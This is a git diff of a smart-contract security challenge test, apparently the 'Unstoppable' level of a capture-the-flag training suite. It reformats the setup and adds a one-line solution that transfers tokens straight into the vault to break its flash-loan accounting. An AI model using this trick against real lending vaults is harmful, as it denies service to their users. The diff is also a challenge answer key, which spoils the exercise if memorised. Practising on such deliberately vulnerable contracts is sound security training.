@@ -10,20 +10,19 @@ describe('[Challenge] Unstoppable', function () {
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-
         [deployer, player, someUser] = await ethers.getSigners();
-
+        
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
         vault = await (await ethers.getContractFactory('UnstoppableVault', deployer)).deploy(
             token.address,
             deployer.address, // owner
             deployer.address // fee recipient
-        );
-        expect(await vault.asset()).to.eq(token.address);
-
+            );
+            expect(await vault.asset()).to.eq(token.address);
+            
         await token.approve(vault.address, TOKENS_IN_VAULT);
         await vault.deposit(TOKENS_IN_VAULT, deployer.address);
-
+        
         expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
         expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
         expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
@@ -31,11 +30,10 @@ describe('[Challenge] Unstoppable', function () {
         expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
         expect(
             await vault.flashFee(token.address, TOKENS_IN_VAULT)
-        ).to.eq(50000n * 10n ** 18n);
-
-        await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
-        expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);
-
+            ).to.eq(50000n * 10n ** 18n);
+            
+            await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
+            expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);
         // Show it's possible for someUser to take out a flash loan
         receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
             vault.address
@@ -45,7 +43,10 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        token.transfer(vault.address,10)
+    
     });
+    
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
